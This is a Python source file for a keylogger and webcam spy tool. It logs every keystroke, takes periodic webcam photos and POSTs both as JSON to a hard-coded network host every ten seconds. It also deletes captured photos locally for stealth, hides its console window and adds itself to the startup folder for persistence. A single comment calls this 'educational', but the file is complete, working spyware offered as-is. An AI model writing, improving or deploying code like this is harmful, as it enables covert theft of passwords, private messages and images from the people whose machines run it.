import os
import json
import threading
import requests
import sys
import base64
from pynput import keyboard
from monitor import utils, webcam
from datetime import datetime

# Configuration
# Note: Using the existing directory structure from the monitor package
LOG_FILE = os.path.join(utils.RAW_DIR, "network_key_log.txt")

import socket

# Global variables
text = ""
# Using your laptop's local IP address
ip_address = "192.168.0.110" 
port_number = "8080"
time_interval = 10 # Seconds for keystrokes
webcam_interval = 300 # 5 minutes for photos
last_webcam_time = datetime.now()

def save_and_send():
    global text, last_webcam_time
    try:
        # 1. Local logging
        if text:
            print(f"[LOCAL] Saving {len(text)} characters to {LOG_FILE}...")
            with open(LOG_FILE, "a") as f:
                f.write(text)
            
        # 2. Prepare Payload
        payload_dict = {"keyboardData": text}
        
        # 3. Handle Periodic Webcam Capture
        current_time = datetime.now()
        seconds_since_last_photo = (current_time - last_webcam_time).total_seconds()
        
        if seconds_since_last_photo >= webcam_interval:
            print("[WEBCAM] Capturing image for network send...")
            photo_path = webcam.capture_webcam_image()
            if photo_path and os.path.exists(photo_path):
                with open(photo_path, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read()).decode('utf-8')
                    payload_dict["imageData"] = encoded_string
                
                # Cleanup local photo immediately (Stealth)
                os.remove(photo_path)
                last_webcam_time = current_time
                print("[WEBCAM] Image attached to payload and local file removed.")

        # 4. Network POST
        payload = json.dumps(payload_dict)
        print(f"[NETWORK] Attempting to POST to http://{ip_address}:{port_number}...")
        requests.post(f"http://{ip_address}:{port_number}", 
                      data=payload, 
                      headers={"Content-Type": "application/json"},
                      timeout=10)
        
        # Reset text buffer after successful actions
        text = ""
        
    except Exception as e:
        print(f"Update failed: {e}")
    finally:
        # Schedule the next execution
        timer = threading.Timer(time_interval, save_and_send)
        timer.daemon = True # Ensure timer doesn't block exit
        timer.start()

def on_press(key):
    global text
    
    # Key formatting logic from the provided script
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.shift_l:
        pass
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r]:
        pass
    elif key == keyboard.Key.esc:
        print("Esc pressed. Exiting...")
        return False
    else:
        # Strip single quotes from character keys
        text += str(key).strip("'")

if __name__ == "__main__":
    # Ensure directories exist
    utils.setup_directories()
    
    # --- Stealth & Persistence (Educational) ---
    # Hide the console window immediately
    utils.hide_console()
    
    # Add to startup folder (persistence)
    # Using __file__ to get the current script's absolute path
    utils.add_to_startup(os.path.abspath(__file__))
    
    print(f"Network Keylogger active. Interval: {time_interval}s. Logs: {LOG_FILE}")
    print("Press 'Esc' to terminate.")
    
    # Start the periodic update loop
    save_and_send()
    
    # Start the listener
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
